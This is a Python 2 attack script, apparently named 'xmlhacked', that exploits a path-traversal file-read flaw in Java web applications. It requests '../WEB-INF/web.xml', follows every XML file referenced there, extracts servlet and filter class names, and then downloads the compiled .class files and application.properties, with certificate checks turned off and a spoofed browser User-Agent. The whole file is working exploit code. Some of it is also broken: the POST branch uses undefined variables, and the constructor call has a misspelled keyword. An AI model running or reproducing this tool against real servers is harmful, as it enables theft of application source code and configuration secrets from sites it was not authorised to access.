import optparse
import os
import re
from xml.dom.minidom import parseString
import xml.dom.minidom
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import requests
import sys

reload(sys)
sys.setdefaultencoding( "utf-8" )
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class xmlhacked():
    def __init__(self, xmlurl, data=None, \
            datatype="application/x-www-form-urlencoded",
            cookie=""):
        '''
        https://xxx.xxxx/?url=../WEB-INF/web.xml
        or 
        https://xxx.xxx/
        -p"url=../WEB-INF/web.xml"
        '''
        self.xmlurl = xmlurl
        self.data = data
        self.headers = {
            "User-Agent": "Mozilla/5.0 \
                (Windows NT 10.0; Win64; x64) \
                AppleWebKit/537.36 (KHTML, like \
                Gecko) Chrome/73.0.3683.47 Safari/537.36",
            "Content-Type": datatype,
            "Cookie": cookie
        }
        self.dict = []
        self.properties = [
            "WEB-INF/classes/application.properties",
        ]
        self.path = self.xmlurl.split("/")[2]
        self.pattern = re.compile("WEB-INF/[/0-9a-zA-Z_\*]+\.xml")
        self.class_pattern = re.compile("<[a-zA-Z]+-class>([0-9a-zA-Z_\.]*?)</[a-zA-Z]+-class>")
        self.class_ = []
        self.filelist = []
    


    def get_xml(self):
        dicts = ["WEB-INF/web.xml"]
        while dicts:
            xml_ = dicts.pop()
            self.dict.append(xml_)
            print("[+] find xml %s" % xml_)
            path = "%s/%s" % (self.path,"/".join(xml_.split("/")[:-1]))
            if not os.path.exists(path):
                os.makedirs(path)
            try:
                if self.data:
                    deta = self.pattern.sub(xml_, self.data)
                    req = requests.post(self.url, data=data,
                            headers=self.headers, verify=False).text
                else:
                    url = self.pattern.sub(xml_, self.xmlurl)
                    req = requests.get(url,\
                        headers=self.headers, verify=False).text
            except:
                continue
            with open("%s/%s" % \
                    (self.path, xml_), "w") as f:
                f.write(req)
            new_xml = self.pattern.findall(req)
            for x in new_xml:
                if x in self.dict:
                    new_xml.remove(x)
            dicts.extend(new_xml)
        
    
    def parse_xml(self):
        for xml_ in self.dict:
            with open("%s/%s" % (self.path, xml_), "r") as f:
                req = f.read()
            class_ = self.class_pattern.findall(req)
            class_ = [i.replace(".", '/')+".class" for i in class_]
            self.class_.extend(class_)
        classes = set(self.class_)
        for class_ in classes:
            print("[+] find class %s" % class_)
            path = "%s/WEB-INF/classes/%s" % (self.path,"/".join(class_.split("/")[:-1]))
            if not os.path.exists(path):
                os.makedirs(path)
            try:
                if self.data:
                    deta = self.pattern.sub("WEB-INF/classes/%s" % class_, self.data)
                    req = requests.post(self.url, data=data,
                            headers=self.headers, verify=False).content
                else:
                    url = self.pattern.sub("WEB-INF/classes/%s" % class_, self.xmlurl)
                    req = requests.get(url,\
                        headers=self.headers, verify=False).content
            except:
                continue
            with open("%s/WEB-INF/classes/%s" % \
                    (self.path, class_), "w") as f:
                f.write(req)
            

    def save_file(self, filename):
        pass

    def run(self):
        self.get_xml()
        self.parse_xml()


def main():
    parser = optparse.OptionParser('usage %prog -u\
        <targer url> -d <target post data(if it\'s a post requests)>\
            -t <target content-type>')
    parser.add_option('-u', dest='tgturl', type='string',\
        help = 'url')
    parser.add_option('-d', dest='tgtdata', type='string',\
        help = 'post data(if it\'s a post requests')
    parser.add_option('-t', dest="tgttype", type='string',\
        help = 'content-type')
    parser.add_option('-c', dest="tgtcookie", type='string',\
        help = 'cookie')
    ( option, parser ) = parser.parse_args()
    xmlurl = option.tgturl
    data = option.tgtdata
    type_ = option.tgttype
    cookie = option.tgtcookie
    if not xmlurl:
        print("[-] no url and data")
    elif not type_:
        target = xmlhacked(xmlurl=xmlurl,data=data)
    else:
        target = xmlhacked(urxmlurll=xmlurl,data=data, type=type_)

    target.run()


main()